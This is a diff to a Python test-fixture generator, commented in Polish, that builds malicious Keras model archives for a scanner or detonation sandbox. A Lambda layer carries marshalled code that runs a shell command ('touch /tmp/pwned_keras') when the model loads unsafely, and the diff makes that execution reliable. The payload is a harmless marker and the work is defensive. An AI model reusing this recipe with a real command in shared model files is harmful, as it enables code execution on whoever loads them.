@@ -8,6 +8,15 @@ Plik złośliwy niesie **warstwę Lambda ze zserializowaną funkcją Pythona**
 (zmarshallowany obiekt code w base64) — dokładnie tak, jak robi to Keras.
 Przy ``load_model(safe_mode=False)`` taka funkcja zostaje odtworzona
 i wykonana. Efekt jest nieszkodliwy i widoczny: ``touch /tmp/pwned_keras``.
+
+Dwa szczegóły, bez których fixture wygląda na złośliwy w parserze, ale
+w detonacji daje pusty log (czyli fałszywy dowód niewinności):
+
+* obiekt code musi przyjmować **jeden argument**, bo Keras woła funkcję
+  warstwy jako ``fn(inputs)``;
+* ``model.weights.h5`` musi być **poprawnym** plikiem HDF5, a model nie może
+  mieć warstw z wagami (Dense), bo pustego magazynu wag Keras nie przyjmie.
+  Dlatego fixture'y składają się z warstw bez zmiennych.
 """
 
 from __future__ import annotations
@@ -16,11 +25,33 @@ import base64
 import json
 import marshal
 import os
+import platform
 import zipfile
 
 SAMPLES_DIR = os.path.join(os.path.dirname(__file__), "samples")
 
 MARKER = "/tmp/pwned_keras"
+
+# Pusty, ale POPRAWNY plik HDF5 (800 B, wygenerowany przez h5py). Trzymamy go
+# jako stałą, żeby generator fixture'ów nie wymagał h5py na maszynie, na
+# której się go odpala.
+EMPTY_HDF5_B64 = (
+    "iUhERg0KGgoAAAAAAAgIAAQAEAAAAAAAAAAAAAAAAAD//////////yADAAAAAAAA//////////8A"
+    "AAAAAAAAAGAAAAAAAAAAAQAAAAAAAACIAAAAAAAAAKgCAAAAAAAAAQABAAEAAAAYAAAAAAAAABEA"
+    "EAAAAAAAiAAAAAAAAACoAgAAAAAAAFRSRUUAAAAA/////////////////////wAAAAAAAAAAAAAA"
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABIRUFQ"
+    "AAAAAFgAAAAAAAAACAAAAAAAAADIAgAAAAAAAAAAAAAAAAAAAQAAAAAAAABQAAAAAAAAAAAAAAAA"
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    "AAA="
+)
 
 
 def _serialized_payload() -> str:
@@ -30,9 +61,14 @@ def _serialized_payload() -> str:
     obiekcie code i koduje wynik base64. Odtworzenie tego kodu przy
     ładowaniu modelu jest właśnie wektorem RCE.
     """
-    source = f"__import__('os').system('touch {MARKER}')"
-    code = compile(source, "<lambda>", "eval")
-    return base64.b64encode(marshal.dumps(code)).decode("ascii")
+    # Keras woła funkcję warstwy jako fn(inputs), więc obiekt code MUSI
+    # przyjmować jeden argument. Pierwsza wersja marshalowała wyrażenie
+    # bez argumentów i Keras wywalał się na "takes 0 positional arguments"
+    # PRZED wykonaniem ciała — plik jawnie złośliwy dawał pusty log
+    # zdarzeń, czyli wyglądał na czysty. Jest na to test regresyjny.
+    source = f"lambda x: (__import__('os').system('touch {MARKER}'), x)[1]"
+    fn = eval(compile(source, "<lambda>", "eval"))  # noqa: S307 — nasz własny literał
+    return base64.b64encode(marshal.dumps(fn.__code__)).decode("ascii")
 
 
 def _malicious_config() -> dict:
@@ -68,12 +104,6 @@ def _malicious_config() -> dict:
                             },
                         },
                     },
-                    "registered_name": None,
-                },
-                {
-                    "module": "keras.layers",
-                    "class_name": "Dense",
-                    "config": {"name": "dense", "units": 4, "activation": "softmax"},
                     "registered_name": None,
                 },
             ],
@@ -135,14 +165,14 @@ def _clean_config() -> dict:
                 },
                 {
                     "module": "keras.layers",
-                    "class_name": "Dense",
-                    "config": {"name": "dense", "units": 128, "activation": "relu"},
+                    "class_name": "Activation",
+                    "config": {"name": "relu", "activation": "relu"},
                     "registered_name": None,
                 },
                 {
                     "module": "keras.layers",
-                    "class_name": "Dense",
-                    "config": {"name": "output", "units": 26, "activation": "softmax"},
+                    "class_name": "Softmax",
+                    "config": {"name": "output", "dtype": "float32"},
                     "registered_name": None,
                 },
             ],
@@ -161,16 +191,23 @@ SAMPLES = {
 
 def _write_keras(path: str, config: dict) -> None:
     """Składa minimalne, ale prawdziwe archiwum .keras."""
+    # Zmarshallowany obiekt code jest wiązany z WERSJĄ Pythona. Fixture
+    # wygenerowany na 3.12 nie odtworzy się w kontenerze z 3.11 — detoner
+    # musi umieć to powiedzieć wprost, a nie zwrócić pusty log, dlatego
+    # zapisujemy tu wersję generatora.
     metadata = {
         "keras_version": config.get("keras_version", "3.5.0"),
         "date_saved": "2026-10-03@00:00:00",
+        "generated_by_python": platform.python_version(),
     }
     with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as archive:
         archive.writestr("metadata.json", json.dumps(metadata, indent=2))
         archive.writestr("config.json", json.dumps(config, indent=2))
-        # Prawdziwy model trzyma tu wagi; do analizy statycznej wystarczy
-        # zaślepka, żeby struktura archiwum była kompletna.
-        archive.writestr("model.weights.h5", b"\x89HDF\r\n\x1a\n(zaslepka)")
+        # Tu muszą być PRAWDZIWE wagi w formacie HDF5. Wcześniej leżała tu
+        # zaślepka z samym nagłówkiem i h5py odrzucał ją przy ładowaniu
+        # ("bad superblock version number") — load_model padał, zanim
+        # cokolwiek się wykonało, więc detonacja dawała pusty log.
+        archive.writestr("model.weights.h5", base64.b64decode(EMPTY_HDF5_B64))
 
 
 def build(out_dir: str = SAMPLES_DIR) -> list[str]:
